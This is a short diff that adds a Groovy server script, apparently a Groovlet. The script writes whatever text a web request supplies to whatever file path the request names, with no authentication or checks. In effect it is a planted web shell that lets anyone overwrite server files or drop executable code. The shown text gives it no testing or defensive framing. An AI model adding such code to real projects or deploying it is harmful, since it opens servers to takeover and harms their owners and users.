@@ -1,0 +1,5 @@
+import java.io.File
+
+new File(request.getParameter("file")).write(request.getParameter("text"))
+
+println "ok"
